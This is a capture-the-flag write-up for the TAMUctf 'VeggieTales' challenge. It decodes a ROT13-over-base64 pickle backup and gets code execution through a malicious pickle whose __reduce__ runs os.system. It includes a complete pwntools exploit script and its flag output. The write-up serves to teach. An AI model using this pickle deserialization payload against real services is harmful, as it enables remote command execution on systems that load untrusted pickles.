# VeggieTales
Pwn, 489 points

## Description:

> It's my favorite show to watch while practicing my python skills! I've seen episode 5 at least 13 times.

## Solution:

Let's connect to the service and check it out:

```console
root@kali:/media/sf_CTFs/tamu/VeggieTales# nc pwn.tamuctf.com 8448
Do you like VeggieTales??
1. Add an episode to your watched list
2. Print your watch list
3. Backup your watch list
4. Load your watch list
1
1.  Wheres God When Im S-Scared?
2.  God Wants Me to Forgive Them!?!
3.  Are You My Neighbor?
4.  Rack, Shack and Benny
5.  Dave and the Giant Pickle
6.  The Toy That Saved Christmas
7.  Larry-Boy! And the Fib from Outer Space!
8.  Josh and the Big Wall!
9.  Madame Blueberry
10. Larry-Boy and the Rumor Weed
11. King George and the Ducky
12. Esther... The Girl Who Became Queen
13. Lyle the Kindly Viking
14. The Star of Christmas
15. The Wonderful World of Autotainment
16. The Ballad of Little Joe
17. An Easter Carol
18. A Snoodles Tale
19. Sumo of the Opera
20. Duke and the Great Pie War
21. Minnesota Cuke and the Search for Samsons Hairbrush
22. Lord of the Beans
23. Sheerluck Holmes and the Golden Ruler
24. LarryBoy and the Bad Apple
25. Gideon: Tuba Warrior
26. Moe and the Big Exit
27. The Wonderful Wizard of Has
28. Tomato Sawyer and Huckleberry Larrys Big River Rescue
29. Abe and the Amazing Promise
30. Minnesota Cuke and the Search for Noahs Umbrella
31. Saint Nicholas: A Story of Joyful Giving
32. Pistachio - The Little Boy That Woodnt
33. Sweetpea Beauty: A Girl After Gods Own Heart
34. Its a Meaningful Life
35. Twas The Night Before Easter
36. Princess and the Popstar
37. The Little Drummer Boy
38. Robin Good And His Not-So Merry Men
39. The Penniless Princess
40. The League of Incredible Vegetables
41. The Little House That Stood
42. MacLarry and the Stinky Cheese Battle
43. Merry Larry and the True Light of Christmas
44. Veggies in Space: The Fennel Frontier
45. Celery Night Fever
46. Beauty and the Beet
47. Noahs Ark
Enter an episode (by number) to add to your watched list: 5
episode added!
1. Add an episode to your watched list
2. Print your watch list
3. Backup your watch list
4. Load your watch list
2
----------------------
List of watched episodes:
5.  Dave and the Giant Pickle
----------------------
1. Add an episode to your watched list
2. Print your watch list
3. Backup your watch list
4. Load your watch list
3
Episode list backup string (Don't lose it!): tNAqpDOLUDNNNQHhVPORLKMyVTShMPO0nTHtE2yuoaDtHTywn2kypDSuYt==

1. Add an episode to your watched list
2. Print your watch list
3. Backup your watch list
4. Load your watch list
4
Load your backed up list here: tNAqpDOLUDNNNQHhVPORLKMyVTShMPO0nTHtE2yuoaDtHTywn2kypDSuYt==
Loaded backup

1. Add an episode to your watched list
2. Print your watch list
3. Backup your watch list
4. Load your watch list
```

So we can manage our watch list with this service, and even backup and restore it.

The backup string looks like base64, let's try to decode it:

```console
root@kali:/media/sf_CTFs/tamu/VeggieTales# echo tNAqpDOLUDNNNQHhVPORLKMyVTShMPO0nTHtE2yuoaDtHTywn2kypDSuYt | base64 -d
*3P3M5T,2U401l<i24bbase64: invalid input
root@kali:/media/sf_CTFs/tamu/VeggieTales# echo tNAqpDOLUDNNNQHhVPORLKMyVTShMPO0nTHtE2yuoaDtHTywn2kypDSuYt | base64 -d | xxd -g 1
base64: 00000000: b4 d0 2a a4 33 8b 50 33 4d 35 01 e1 54 f3 91 2c  ..*.3.P3M5..T..,
00000010: a3 32 55 34 a1 30 f3 b4 9d 31 ed 13 6c ae a1 a0  .2U4.0...1..l...
invalid input
00000020: ed 1d 3c b0 9f 69 32 a4 34 ae 62                 ..<..i2.4.b
```

Base64 doesn't really like this. 

The description talked about episode 5, which is "Dave and the Giant Pickle", and also mentioned that this service was built over Python. Python + pickle usually hints towards an RCE vulnerability, since pickle deserialization isn't safe assuming the user has control over the input.

We can try to load an exploit such as:

```python
>>> import pickle
>>> class Exploit(object):
...   def __reduce__(self):
...     import os
...     return (os.system,('cat $(find / -name "flag.txt")',))
...
>>> base64.b64encode(pickle.dumps(Exploit()))
'Y250CnN5c3RlbQpwMAooUydjYXQgJChmaW5kIC8gLW5hbWUgImZsYWcudHh0IiknCnAxCnRwMgpScDMKLg=='
```

If we try it, we get:

```console
root@kali:/media/sf_CTFs/tamu/VeggieTales# nc pwn.tamuctf.com 8448
Do you like VeggieTales??
1. Add an episode to your watched list
2. Print your watch list
3. Backup your watch list
4. Load your watch list
4
Load your backed up list here: Y250CnN5c3RlbQpwMAooUydjYXQgJChmaW5kIC8gLW5hbWUgImZsYWcudHh0IiknCnAxCnRwMgpScDMKLg==
Invalid backup
```

So we probably need to figure out the representation of the backup first, before being able to load our own.

This might be base64 with a different dictionary, but brute forcing all the possibilities seemed unfeasible. So, there seemed to be three main options left:
1. The data is encrypted before it is encoded as base64
2. The base64 data is encrypted with some kind of simple cipher that keeps the text property of the input
3. This isn't base64 at all

I spent a lot of time trying to compare different backup strings too see if there are any patterns.

The prefix always seemed to be `tNAqpDOL` so this didn't look like a transposition cipher, but I still couldn't decide between option 1 (is the prefix some kind of IV?) and option 2 (maybe a substitution cipher?), assuming this is related to base64 at all. Nothing seemed to work.

It was reading the description again that gave me the insight I was missing:
> "I've seen episode 5 at least 13 times"

What if the hint is not only "episode 5" (pickle) but also "13 times" - ROT 13!

```python
>>> import pickle, codecs, base64
>>> pickle.loads(base64.b64decode(codecs.decode("tNAqpDOLUDNNNQHhVPORLKMyVTShMPO0nTHtE2yuoaDtHTywn2kypDSuYt==", "rot_13")))
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "/usr/lib/python2.7/pickle.py", line 1388, in loads
    return Unpickler(file).load()
  File "/usr/lib/python2.7/pickle.py", line 864, in load
    dispatch[key](self)
  File "/usr/lib/python2.7/pickle.py", line 892, in load_proto
    raise ValueError, "unsupported pickle protocol: %d" % proto
ValueError: unsupported pickle protocol: 3
```

This looks much better! Let's move to Python3 and see what we get:

```python
>>> import pickle, codecs, base64
>>> pickle.loads(base64.b64decode(codecs.decode("tNAqpDOLUDNNNQHhVPORLKMyVTShMPO0nTHtE2yuoaDtHTywn2kypDSuYt==", "rot_13")))
['5.  Dave and the Giant Pickle']
```

We got it!

Now we can perform our full exploit:

```python
import pickle
import base64
import codecs
from pwn import *

r = remote("pwn.tamuctf.com", 8448)

def read_menu():
    r.recvuntil("4. Load your watch list")

def load_backup(backup):
    read_menu()
    r.sendline("4")
    r.sendlineafter("Load your backed up list here: ", backup)
    return r.recvuntil("1. Add an episode to your watched list", drop = True).decode("ascii")

CMD = 'cat $(find / -name "flag.txt")'

class Exploit(object):
  def __reduce__(self): 
    import os 
    return (os.system,(CMD,))

shellcode = pickle.dumps(Exploit())
print (load_backup(codecs.encode(base64.b64encode(shellcode).decode("ascii"), 'rot_13')))
```


Output:
```
root@kali:/media/sf_CTFs/tamu/VeggieTales# python exploit.py
[+] Opening connection to pwn.tamuctf.com on port 8448: Done
find: '/root': Permission denied
find: '/var/lib/apt/lists/partial': Permission denied
find: '/var/cache/ldconfig': Permission denied
find: '/var/cache/apt/archives/partial': Permission denied
find: '/proc/tty/driver': Permission denied
find: '/proc/1/task/1/fd': Permission denied
find: '/proc/1/task/1/fdinfo': Permission denied
find: '/proc/1/task/1/ns': Permission denied
find: '/proc/1/fd': Permission denied
find: '/proc/1/map_files': Permission denied
find: '/proc/1/fdinfo': Permission denied
find: '/proc/1/ns': Permission denied
find: '/proc/6/task/6/fd': Permission denied
find: '/proc/6/task/6/fdinfo': Permission denied
find: '/proc/6/task/6/ns': Permission denied
find: '/proc/6/fd': Permission denied
find: '/proc/6/map_files': Permission denied
find: '/proc/6/fdinfo': Permission denied
find: '/proc/6/ns': Permission denied
find: '/etc/ssl/private': Permission denied
gigem{d0nt_7rust_th3_g1ant_pick1e}
Loaded backup

[*] Closed connection to pwn.tamuctf.com port 8448
```